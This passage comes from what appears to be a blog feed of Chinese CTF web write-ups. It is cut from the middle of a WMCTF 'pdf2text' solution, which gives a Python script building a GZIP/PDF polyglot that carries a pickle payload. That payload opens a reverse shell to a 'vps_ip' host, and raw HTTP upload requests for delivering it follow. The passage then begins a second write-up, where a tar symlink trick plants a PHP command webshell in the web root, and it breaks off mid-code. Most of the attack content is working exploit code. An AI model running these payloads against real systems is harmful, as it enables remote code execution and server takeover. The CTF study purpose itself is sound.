class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><span class="line">```python</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_minimal_pdf</span>(<span class="params">base_offset: <span class="built_in">int</span> = <span class="number">0</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build a minimal valid PDF with absolute xref offsets accounting for base_offset</span></span><br><span class="line"></span><br><span class="line">    header = <span class="string">b&quot;%PDF-1.4\n%\xE2\xE3\xCF\xD3\n&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    obj1 = <span class="string">b&quot;&quot;&quot;1 0 obj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Catalog /Pages 2 0 R &gt;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    obj2 = <span class="string">b&quot;&quot;&quot;2 0 obj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Pages /Kids [3 0 R] /Count 1 &gt;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    obj3 = <span class="string">b&quot;&quot;&quot;3 0 obj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;&lt; /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R &gt;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">endobj</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.replace(<span class="string">b&quot;\r&quot;</span>, <span class="string">b&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    stream_body = <span class="string">b&quot;Hello WMCTF!&quot;</span>  <span class="comment"># small visible text</span></span><br><span class="line"></span><br><span class="line">    obj4 = (<span class="string">b&quot;4 0 obj\n&lt;&lt; /Length %d &gt;&gt;\nstream\n&quot;</span> % <span class="built_in">len</span>(stream_body)) + stream_body + <span class="string">b&quot;\nendstream\nendobj\n&quot;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Build PDF body and record absolute offsets</span></span><br><span class="line"></span><br><span class="line">    pdf = header</span><br><span class="line"></span><br><span class="line">    abs_offsets = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> obj <span class="keyword">in</span> (obj1, obj2, obj3, obj4):</span><br><span class="line"></span><br><span class="line">        abs_offsets.append(base_offset + <span class="built_in">len</span>(pdf))</span><br><span class="line"></span><br><span class="line">        pdf += obj</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># xref and trailer with absolute positions</span></span><br><span class="line"></span><br><span class="line">    xref_abs_offset = base_offset + <span class="built_in">len</span>(pdf)</span><br><span class="line"></span><br><span class="line">    xref_lines = [<span class="string">&quot;xref&quot;</span>, <span class="string">&quot;0 5&quot;</span>, <span class="string">&quot;0000000000 65535 f &quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> off <span class="keyword">in</span> abs_offsets:</span><br><span class="line"></span><br><span class="line">        xref_lines.append(<span class="string">f&quot;<span class="subst">&#123;off:<span class="number">0</span>10d&#125;</span> 00000 n &quot;</span>)</span><br><span class="line"></span><br><span class="line">    xref = (<span class="string">&quot;\n&quot;</span>.join(xref_lines) + <span class="string">&quot;\n&quot;</span>).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    trailer = (<span class="string">&quot;trailer\n&lt;&lt; /Size 5 /Root 1 0 R &gt;&gt;\nstartxref\n&quot;</span> + <span class="built_in">str</span>(xref_abs_offset) + <span class="string">&quot;\n%%EOF\n&quot;</span>).encode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> pdf + xref + trailer</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_gzip_with_extra</span>(<span class="params">extra_bytes: <span class="built_in">bytes</span>, payload_bytes: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line"></span><br><span class="line">    <span class="comment"># GZIP header with FEXTRA holding extra_bytes (uncompressed), then deflate-compressed payload, then CRC/ISIZE</span></span><br><span class="line"></span><br><span class="line">    ID1, ID2, CM = <span class="number">0x1F</span>, <span class="number">0x8B</span>, <span class="number">0x08</span></span><br><span class="line"></span><br><span class="line">    FLG = <span class="number">0x04</span>  <span class="comment"># FEXTRA</span></span><br><span class="line"></span><br><span class="line">    MTIME = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    XFL = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    OS = <span class="number">255</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(extra_bytes) &gt; <span class="number">0xFFFF</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;extra_bytes too long for GZIP FEXTRA (max 65535)&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    header = <span class="built_in">bytes</span>([ID1, ID2, CM, FLG])</span><br><span class="line"></span><br><span class="line">    header += struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, MTIME)</span><br><span class="line"></span><br><span class="line">    header += <span class="built_in">bytes</span>([XFL, OS])</span><br><span class="line"></span><br><span class="line">    header += struct.pack(<span class="string">&#x27;&lt;H&#x27;</span>, <span class="built_in">len</span>(extra_bytes))</span><br><span class="line"></span><br><span class="line">    header += extra_bytes</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># raw deflate for payload</span></span><br><span class="line"></span><br><span class="line">    comp = zlib.compressobj(level=<span class="number">9</span>, wbits=-<span class="number">15</span>)</span><br><span class="line"></span><br><span class="line">    comp_data = comp.compress(payload_bytes) + comp.flush()</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    crc = zlib.crc32(payload_bytes) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    isize = <span class="built_in">len</span>(payload_bytes) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    trailer = struct.pack(<span class="string">&#x27;&lt;II&#x27;</span>, crc, isize)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> header + comp_data + trailer</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># When storing PDF in GZIP FEXTRA, the PDF starts at byte offset 12 from file start</span></span><br><span class="line"></span><br><span class="line">    base_offset = <span class="number">12</span>  <span class="comment"># 10-byte gzip fixed header + 2-byte XLEN</span></span><br><span class="line"></span><br><span class="line">    pdf_bytes = build_minimal_pdf(base_offset=base_offset)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># payload to be recovered after decompression</span></span><br><span class="line"></span><br><span class="line">    opcode_bytes = <span class="string">b&#x27;&#x27;&#x27;(S&#x27;python -c \&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps_ip&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)\&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ios</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    gz_polyglot = build_gzip_with_extra(extra_bytes=pdf_bytes, payload_bytes=opcode_bytes)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;opcode.gz&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line"></span><br><span class="line">        f.write(gz_polyglot)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Diagnostics</span></span><br><span class="line"></span><br><span class="line">    idx = gz_polyglot.find(<span class="string">b&quot;%PDF-&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%PDF- found at offset:&quot;</span>, idx)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Total size:&quot;</span>, <span class="built_in">len</span>(gz_polyglot))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># Quick local checks</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 1) Decompress to verify opcode</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> gzip</span><br><span class="line"></span><br><span class="line">        data = gzip.decompress(gz_polyglot)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decompressed data:&quot;</span>, data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Decompress failed:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2) Basic header preview for PDF</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Header preview around %PDF-:&quot;</span>, gz_polyglot[idx:idx+<span class="number">20</span>] <span class="keyword">if</span> idx != -<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;生成 polyglot: 有效GZIP(可解压得到opcode) + 头部携带有效PDF(可通过PDF解析)&quot;</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>poc:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-ada">Host: <span class="number">49.232</span>.<span class="number">42.74</span>:<span class="number">32532</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>: */*</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>-Encoding: gzip, deflate, br, zstd</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Mode: cors</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-<span class="keyword">Type</span>: multipart/form-data; boundary=<span class="comment">----WebKitFormBoundaryS0A1ddjzN4AjJWUx</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>-Language: zh-CN,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua-mobile: ?<span class="number">0</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">140.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Origin: http://localhost:<span class="number">11451</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Referer: http://localhost:<span class="number">11451</span>/</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Dest: empty</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;140&quot;</span>, <span class="string">&quot;Not=A?Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;140&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-Length: <span class="number">348</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">  </span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="comment">------WebKitFormBoundaryS0A1ddjzN4AjJWUx</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;n4c1.pickle.gz&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">  </span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">&#123;&#123;file(opcode.gz)&#125;&#125;</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="comment">------WebKitFormBoundaryS0A1ddjzN4AjJWUx--</span></span></span><br></pre></td></tr></table></figure><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"></span><br><span class="line"><span class="language-ada">Host: <span class="number">49.232</span>.<span class="number">42.74</span>:<span class="number">32532</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>: */*</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>-Encoding: gzip, deflate, br, zstd</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Mode: cors</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-<span class="keyword">Type</span>: multipart/form-data; boundary=<span class="comment">----WebKitFormBoundaryS0A1ddjzN4AjJWUx</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="keyword">Accept</span>-Language: zh-CN,zh;q=<span class="number">0.9</span>,en;q=<span class="number">0.8</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua-mobile: ?<span class="number">0</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">140.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Origin: http://localhost:<span class="number">11451</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Referer: http://localhost:<span class="number">11451</span>/</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Dest: empty</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua: <span class="string">&quot;Chromium&quot;</span>;v=<span class="string">&quot;140&quot;</span>, <span class="string">&quot;Not=A?Brand&quot;</span>;v=<span class="string">&quot;24&quot;</span>, <span class="string">&quot;Google Chrome&quot;</span>;v=<span class="string">&quot;140&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Sec-Fetch-Site: same-origin</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">sec-ch-ua-platform: <span class="string">&quot;Windows&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-Length: <span class="number">348</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">  </span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="comment">------WebKitFormBoundaryS0A1ddjzN4AjJWUx</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;debug_ops.pdf&quot;</span></span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">Content-<span class="keyword">Type</span>: application/pdf</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">  </span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada">&#123;&#123;file(debug_ops.pdf)&#125;&#125;</span></span><br><span class="line"><span class="language-ada"></span></span><br><span class="line"><span class="language-ada"><span class="comment">------WebKitFormBoundaryS0A1ddjzN4AjJWUx--</span></span></span><br></pre></td></tr></table></figure><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250920235049.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;pdf2text&quot;&gt;&lt;a href=&quot;#pdf2text&quot; class=&quot;headerlink&quot; title=&quot;pdf2text&quot;&gt;&lt;/a&gt;pdf2text&lt;/h2&gt;&lt;p&gt;题目代码&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;tab</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>长城杯网络安全大赛暨京津冀蒙网络安全技能竞赛（初赛） WEB WP</title>
    <link href="http://example.com/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/"/>
    <id>http://example.com/2025/09/15/%E9%95%BF%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E6%9A%A8%E4%BA%AC%E6%B4%A5%E5%86%80%E8%92%99%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B%EF%BC%88%E5%88%9D%E8%B5%9B%EF%BC%89-WEB-WP/</id>
    <published>2025-09-15T09:07:40.000Z</published>
    <updated>2025-09-15T09:09:21.136Z</updated>
    
    <content type="html"><![CDATA[<h2 id="文曲签学"><a href="#文曲签学" class="headerlink" title="文曲签学"></a>文曲签学</h2><p><img src="https://images-1321971079.cos.ap-beijing.myqcloud.com/blog-images/20250914125219.png" alt="image.png"></p><h2 id="EZ-upload"><a href="#EZ-upload" class="headerlink" title="EZ_upload"></a>EZ_upload</h2><p>分为两步解决,</p><ol><li><p>第一步:上传一个symlink.tar, 将其解压后在tmp目录创建一个&#x2F;tmp&#x2F;my_link指向&#x2F;var&#x2F;www&#x2F;html</p></li><li><p>第二步:上传webshell.tar, 解压时将其中的webshell.php解压到&#x2F;tmp&#x2F;my_link中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3  </span></span><br><span class="line"><span class="comment"># make_two_stage_tar.py  </span></span><br><span class="line"><span class="comment"># 生成两个 tar:#  1) symlink.tar  -&gt; 包含 symlink &quot;my_link&quot; -&gt; &quot;/var/www/html&quot;#  2) webshell.tar -&gt; 包含文件 &quot;my_link/webshell.php&quot;#  </span></span><br><span class="line"><span class="comment"># 说明: 在目标上先解 symlink.tar（在 /tmp 下），再解 webshell.tar。  </span></span><br><span class="line"><span class="comment">#       如果 /tmp/my_link 是符号链接并指向 /var/www/html，则解 webshell.tar 时会尝试写入 /var/www/html/webshell.php  </span></span><br><span class="line"><span class="keyword">import</span> tarfile, io, time, os  </span><br><span class="line">php_shell = <span class="string">b&quot;&lt;?php if(isset($_REQUEST[&#x27;cmd&#x27;]))&#123; system($_REQUEST[&#x27;cmd&#x27;]); &#125; else &#123; echo &#x27;ok&#x27;; &#125; ?&gt;\n&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_symlink_tar</span>(<span class="params">path=<span class="string">&quot;symlink.tar&quot;</span>, link_name=<span class="string">&quot;my_link&quot;</span>, link_target=<span class="string">&quot;/var/www/html&quot;</span></span>):  </span><br><span class="line">    <span class="keyword">with</span> tarfile.<span class="built_in">open</span>(path, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> tar:  </span><br><span class="line">        ti = tarfile.TarInfo(name=link_name)  </span><br><span class="line">        ti.<span class="built_in">type</span> = tarfile.SYMTYPE  <span 